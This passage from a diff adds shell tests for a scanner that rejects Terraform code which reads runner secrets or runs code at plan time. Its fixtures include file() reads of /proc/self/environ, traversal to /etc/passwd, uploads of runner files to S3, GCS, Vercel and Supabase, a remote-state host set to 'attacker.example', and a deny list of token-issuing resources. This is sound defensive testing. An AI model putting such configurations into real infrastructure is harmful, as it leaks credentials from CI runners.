+      can(regex("^[A-Za-z0-9_./-]+\\.ya?ml$", coalesce(var.landing_zone_config_path, "x"))) &&
+      !startswith(coalesce(var.landing_zone_config_path, "x"), "/") &&
+      length([for s in split("/", dirname("./${coalesce(var.landing_zone_config_path, "x")}/_")) : s if s == ".."]) <= 3
+    )
+    error_message = "x"
+  }
+}'
+loader_tree() { # loader_tree <name> <config.tf> <variables.tf>
+  local t="${workdir}/$1"
+  add_file "${t}" envs/aws/r/config.tf "$2"
+  add_file "${t}" envs/aws/r/variables.tf "$3"
+  echo "${t}"
+}
+expect_rc "SEC-1: the reviewed config loader passes" 0 "$(loader_tree loaderok "${LOADER_LOCALS}" "${LOADER_VAR}")"
+expect_rc "SEC-1: the loader form outside config.tf fails" 1 "$(case_tree loaderelse envs/aws/r/main.tf "${LOADER_LOCALS}")" "file(f)"
+expect_rc "SEC-1 (re-audit 5): file(f) with f bound to /proc/self/environ fails" 1 "$(loader_tree loaderleak "${LOADER_LOCALS}
+locals {
+  leak = [for f in [\"/proc/self/environ\"] : tonumber(file(f))]
+}" "${LOADER_VAR}")" "file(f) reads a path from a reference"
+expect_rc "SEC-1 (re-audit 5): a rebound landing_zone_config_file fails" 1 "$(loader_tree loaderrebind "${LOADER_LOCALS/\$\{path.root\}\/..\/..\/..\/config\/landing-zone.yaml/\/proc\/self\/environ}" "${LOADER_VAR}")" "local.landing_zone_config_file is not the reviewed definition"
+expect_rc "SEC-1 (re-audit 5): the loader without the path validation fails" 1 "$(loader_tree loadernoval "${LOADER_LOCALS}" 'variable "landing_zone_config_path" {
+  type    = string
+  default = null
+}')" "lacks the reviewed path validation"
+expect_rc "SEC-1 (re-audit 5): a raised ../ depth fails" 1 "$(loader_tree loaderdepth "${LOADER_LOCALS}" "${LOADER_VAR/<= 3/<= 9}")" "lacks the reviewed path validation"
+expect_rc "SEC-1 (re-audit 5): a short-circuited path validation fails" 1 "$(loader_tree loadertrue "${LOADER_LOCALS}" "${LOADER_VAR/condition = var.landing_zone_config_path == null/condition = true || var.landing_zone_config_path == null}")" "lacks the reviewed path validation"
+# Re-audit 5 review: a depth-2 root may not take the depth-3 loader shape.
+depth_tree() {
+  local t="${workdir}/$1"
+  add_file "${t}" envs/s/config.tf "${LOADER_LOCALS}"
+  add_file "${t}" envs/s/variables.tf "${LOADER_VAR}"
+  echo "${t}"
+}
+expect_rc "SEC-1 (re-audit 5): a depth-2 root with the depth-3 loader fails" 1 "$(depth_tree loaderd2)" "is not the reviewed definition"
+# Re-audit 5 review: a templatefile() template that calls file() fails.
+tpl_tree() {
+  local t="${workdir}/$1"
+  add_file "${t}" modules/a/main.tf 'locals {
+  x = templatefile("${path.module}/t.tftpl", {})
+}'
+  add_file "${t}" modules/a/t.tftpl "$2"
+  echo "${t}"
+}
+expect_rc "SEC-1 (re-audit 5): a template calling file() fails" 1 "$(tpl_tree tplfile '${file("/proc/self/environ")}')" "renders a template that names a file function"
+expect_rc "SEC-1 (re-audit 5 review 2): a commented file() call in a template fails" 1 "$(tpl_tree tplcomment '[${file/*c*/("/proc/self/environ")}]')" "renders a template that names a file function"
+expect_rc "SEC-1 (re-audit 5 review 2): a file() call in a template directive fails" 1 "$(tpl_tree tpldirective '%{ for x in [file("/etc/hosts")] }${x}%{ endfor }')" "renders a template that names a file function"
+expect_rc "SEC-1 (re-audit 5 review 2): path.root in a module fails" 1 "$(case_tree rootinmod modules/a/main.tf 'locals {
+  x = templatefile("${path.root}/t.tftpl", {})
+}')" "reads from path.root in a module"
+expect_rc "SEC-2 (re-audit 5 review 2): data vercel_file fails" 1 "$(case_tree vfile modules/a/main.tf 'data "vercel_file" "f" {
+  path = "/proc/self/environ"
+}')" "vercel_file"
+# Re-audit 6 SEC-2: without -P a file beside the scanner could replace hcl2.
+rc=0
+PLAN_EXEC_TEST=1 PLAN_EXEC_ROOT="${workdir}" python3 "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
+if [ "${rc}" -eq 2 ] && grep -qF -- "python3 -P" "${workdir}/out"; then ok "SEC-2 (re-audit 6): the scanner refuses to run without python3 -P"; else bad "SEC-2 (re-audit 6): the scanner ran without -P (rc=${rc})"; fi
+expect_rc "SEC-1 (re-audit 6): a # in a string literal does not hide file()" 1 "$(tpl_tree tplhash '${"#" != "" ? file("/etc/hosts") : ""}')" "names a file function"
+expect_rc "SEC-1 (re-audit 6): a } in a string literal does not hide file()" 1 "$(tpl_tree tplbrace '${"}" == "}" ? file("/etc/hosts") : ""}')" "names a file function"
+expect_rc "SEC-1 (re-audit 6 review): a %{} directive in a file() path fails" 1 "$(case_tree dirpath envs/x/main.tf 'output "o" {
+  value = file("${path.module}/%{if true}..%{endif}/%{if true}..%{endif}/etc/hosts")
+}')" "template directive or escape"
+expect_rc "SEC-1 (re-audit 6 review): a %{} directive in a templatefile() path fails" 1 "$(case_tree dirtpl modules/a/main.tf 'locals {
+  x = templatefile("${path.module}/%{if false}x%{endif}evil.tftpl", {})
+}')" "template directive or escape"
+# Re-audit 7 SEC-1 to SEC-3: path-reading resource arguments.
+expect_rc "SEC-1 (re-audit 7): an S3 object uploading /proc/self/environ fails" 1 "$(case_tree s3env modules/a/main.tf 'resource "aws_s3_object" "o" {
+  bucket = "b"
+  key    = "k"
+  source = "/proc/self/environ"
+}')" "reads a path on the runner and uploads it"
+expect_rc "SEC-1 (re-audit 7): a GCS object from a variable path fails" 1 "$(case_tree gcsvar modules/a/main.tf 'resource "google_storage_bucket_object" "o" {
+  bucket = "b"
+  name   = "k"
+  source = var.path
+}')" "reads a path on the runner and uploads it"
+expect_rc "SEC-1 (re-audit 7): a Lambda from an archive_file output passes" 0 "$(case_tree lambdaok modules/a/main.tf 'resource "aws_lambda_function" "f" {
+  function_name = "f"
+  role          = "r"
+  filename      = data.archive_file.isolate[0].output_path
+}')"
+expect_rc "SEC-1 (re-audit 7): an S3 object from a path.module file passes" 0 "$(case_tree s3ok modules/a/main.tf 'resource "aws_s3_object" "o" {
+  bucket = "b"
+  key    = "k"
+  source = "${path.module}/files/o.json"
+}')"
+expect_rc "SEC-3 (re-audit 7): a vercel_deployment files map fails" 1 "$(case_tree vdep modules/a/main.tf 'resource "vercel_deployment" "d" {
+  project_id = "p"
+  files      = { "/proc/self/environ" = "1~abc" }
+}')" "uploads local files and is not allowed"
+expect_rc "SEC-2 (re-audit 7): data tfe_slug of / fails" 1 "$(case_tree slug modules/a/main.tf 'data "tfe_slug" "s" {
+  source_path = "/"
+}')" "reads a path on the runner and uploads it"
+# Re-audit 7 CICD-4: the test knobs need PLAN_EXEC_TEST=1, and PYTHONPATH is refused.
+rc=0
+PLAN_EXEC_ROOT="${workdir}" python3 -P "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
+if [ "${rc}" -eq 2 ] && grep -qF -- "test-only" "${workdir}/out"; then ok "CICD-4 (re-audit 7): PLAN_EXEC_ROOT without PLAN_EXEC_TEST is refused"; else bad "CICD-4 (re-audit 7): PLAN_EXEC_ROOT without PLAN_EXEC_TEST ran (rc=${rc})"; fi
+rc=0
+PYTHONPATH="${workdir}" python3 -P "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
+if [ "${rc}" -eq 2 ] && grep -qF -- "PYTHONPATH" "${workdir}/out"; then ok "CICD-4 (re-audit 7): PYTHONPATH is refused"; else bad "CICD-4 (re-audit 7): PYTHONPATH was accepted (rc=${rc})"; fi
+expect_rc "SEC-1 (re-audit 7 review): a Vercel blob uploading a runner file fails" 1 "$(case_tree vblob modules/a/main.tf 'resource "vercel_blob_object" "b" {
+  source = "/proc/self/environ"
+}')" "reads a path on the runner and uploads it"
+expect_rc "SEC-1 (re-audit 7 review): Supabase edge function static files outside the module fail" 1 "$(case_tree sbfn modules/a/main.tf 'resource "supabase_edge_function" "f" {
+  static_files = ["/proc/self/environ"]
+}')" "reads a path on the runner and uploads it"
+expect_rc "SEC-1 (re-audit 5): a plain template passes" 0 "$(tpl_tree tplok '{"a": "${x}"}')"
+expect_rc "SEC-1 (re-audit 5): a missing template fails closed" 1 "$(case_tree tplmissing modules/a/main.tf 'locals {
+  x = templatefile("${path.module}/none.tftpl", {})
+}')" "cannot read"
+expect_rc "SEC-2 (re-audit 5): data aws_eks_cluster_auth fails" 1 "$(case_tree eksauth modules/a/main.tf 'data "aws_eks_cluster_auth" "c" {
+  name = "x"
+}')" "aws_eks_cluster_auth"
+expect_rc "SEC-1 (re-audit 5): a rebound tfc-admin workspace file path fails" 1 "$(case_tree tfcleak envs/tfc-admin/main.tf 'locals {
+  workspace_variables_file_path    = "/proc/self/environ"
+  workspace_variables_file_present = local.workspace_variables_file_path != null && fileexists(coalesce(local.workspace_variables_file_path, "/nonexistent"))
+  workspace_variables_file_raw     = local.workspace_variables_file_present ? yamldecode(file(local.workspace_variables_file_path)) : {}
+}')" "local.workspace_variables_file_path is not the reviewed definition"
+
+# Re-audit 5 SEC-2: token data sources and archive_file of a runner file.
+expect_rc "SEC-2 (re-audit 5): data google_client_config fails" 1 "$(case_tree gcc modules/a/main.tf 'data "google_client_config" "c" {}')" "google_client_config"
+expect_rc "SEC-2 (re-audit 5): archive_file of /proc/self/environ fails" 1 "$(case_tree arcenv modules/a/main.tf 'data "archive_file" "e" {
+  type        = "zip"
+  source_file = "/proc/self/environ"
+  output_path = "${path.module}/e.zip"
+}')" "source_file must be a literal path under path.module"
+expect_rc "SEC-2 (re-audit 5): archive_file source_dir fails" 1 "$(case_tree arcdir modules/a/main.tf 'data "archive_file" "e" {
+  type        = "zip"
+  source_dir  = "${path.module}"
+  output_path = "${path.module}/e.zip"
+}')" "source_dir"
+expect_rc "SEC-2 (re-audit 5): archive_file leaving the repository fails" 1 "$(case_tree arcesc modules/a/main.tf 'data "archive_file" "e" {
+  type        = "zip"
+  source_file = "${path.module}/../../../../etc/passwd"
+  output_path = "${path.module}/e.zip"
+}')" "source_file must be"
+expect_rc "SEC-2 (re-audit 5): archive_file of a module file passes" 0 "$(case_tree arcok modules/a/main.tf 'data "archive_file" "e" {
+  type        = "zip"
+  source_file = "${path.module}/files/f.py"
+  output_path = "${path.root}/.terraform/tmp/f.zip"
+}')"
+
+# SEC-2: a remote-state config may set only organization and workspaces.
+expect_rc "SEC-2: a remote-state hostname fails" 1 "$(case_tree rshost envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "remote"
+  config = {
+    hostname     = "attacker.example"
+    organization = "o"
+    workspaces   = { name = "w" }
+  }
+}')" "hostname"
+expect_rc "SEC-2: a built remote-state config fails" 1 "$(case_tree rsbuilt envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "cloud"
+  config  = merge(local.c, { organization = "o" })
+}')" "object literal"
+expect_rc "SEC-2: a remote-state token in workspaces fails" 1 "$(case_tree rsws envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "cloud"
+  config = {
+    organization = "o"
+    workspaces   = { name = "w", token = "t" }
+  }
+}')" "workspaces must be"
+expect_rc "SEC-2: an organization/workspaces remote-state config passes" 0 "$(case_tree rsok envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "cloud"
+  config = {
+    organization = local.org
+    workspaces   = { name = var.ws }
+  }
+}')"
+
+# --- SEC-2: ephemeral resources ---------------------------------------------------
+for etype in aws_lambda_invocation google_client_config google_service_account_access_token \
+  google_service_account_id_token google_service_account_jwt google_service_account_key \
+  aws_secretsmanager_secret_version aws_ssm_parameter aws_kms_secrets aws_eks_cluster_auth \
+  aws_ecr_authorization_token tfe_team_token tfe_organization_token random_password; do
+  expect_rc "ephemeral ${etype} fails" 1 "$(case_tree "eph${etype}" modules/a/main.tf "ephemeral \"${etype}\" \"x\" {
+  name = \"x\"
+}")" "ephemeral \"${etype}\""
+done
+expect_rc "ephemeral aws_lambda_invocation is reported as code execution" 1 "$(case_tree ephlambda modules/a/main.tf 'ephemeral "aws_lambda_invocation" "x" {
+  function_name = "f"
+  payload       = "{}"
+}')" "runs code or calls out"
+expect_rc "a tf.json ephemeral block fails" 1 "$(case_tree ephjson modules/a/main.tf.json '{"ephemeral": {"google_client_config": {"x": {}}}}')" "google_client_config"
+
+# --- the .rego reader accepts only string literals ------------------------------
+# policy_copy <name>: a copy of the policy files (not the tests) to mutate.
+policy_copy() {
+  local d="${workdir}/$1"
+  mkdir -p "${d}"
+  cp "${REPO_ROOT}/policies/opa/no_plan_time_code_execution.rego" \
+    "${REPO_ROOT}/policies/opa/no_plan_time_code_execution_allowlist.rego" "${d}/"
+  echo "${d}"
+}
+# expect_policy_rc <label> <rc> <policy dir> <text>
+expect_policy_rc() {
+  local rc=0
+  PLAN_EXEC_TEST=1 PLAN_EXEC_POLICY_DIR="$3" PLAN_EXEC_ROOT="${workdir}/clean" python3 -P "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
+  if [ "${rc}" -eq "$2" ] && grep -qF -- "$4" "${workdir}/out"; then ok "$1"; else
+    bad "$1 (rc=${rc}, want $2 with: $4)"
+    cat "${workdir}/out" >&2
+  fi
+}
+d="$(policy_copy polok)"
+expect_policy_rc "an unchanged policy copy is read" 0 "${d}" "0 problem(s)"
+d="$(policy_copy polcomp)"
+python3 - "${d}/no_plan_time_code_execution_allowlist.rego" <<'PY'
+import re, sys
+p = sys.argv[1]
+s = open(p).read()
+s = re.sub(r"allowed_provider_sources := \{.*?\n\}", 'allowed_provider_sources := {x | some x in ["registry.terraform.io/attacker/exfil"]}', s, flags=re.S)
+open(p, "w").write(s)
+PY
+expect_policy_rc "a comprehension in an allowlist exits 2" 2 "${d}" "string literals"
+d="$(policy_copy polexpr)"
+sed -i.bak 's/^allowed_remote_state_backends := .*/allowed_remote_state_backends := {"cloud"} | {"http"}/' "${d}/no_plan_time_code_execution_allowlist.rego"
+expect_policy_rc "a set expression in an allowlist exits 2" 2 "${d}" "string literals"
+d="$(policy_copy poltwice)"
+printf '\nallowed_provider_sources contains "registry.terraform.io/attacker/exfil"\n' >"${d}/extra.rego.tmp"
+{ printf 'package terraform.policies.no_plan_time_code_execution\n'; cat "${d}/extra.rego.tmp"; } >"${d}/extra.rego"
+expect_policy_rc "a second definition in the package exits 2" 2 "${d}" "defined 2 times"
+
+# --- fail closed -----------------------------------------------------------------
+expect_rc "unparseable file fails closed" 1 "$(case_tree broken modules/a/main.tf 'resource "x" {')" "cannot parse"
+expect_rc "unparseable tf.json fails closed" 1 "$(case_tree brokenjson modules/a/main.tf.json '{"resource": ')" "cannot parse"
+
+if [ "${failures}" -ne 0 ]; then
+  echo "${failures} failure(s)" >&2
+  exit 1
+fi
+echo "check-plan-time-exec: all cases pass"
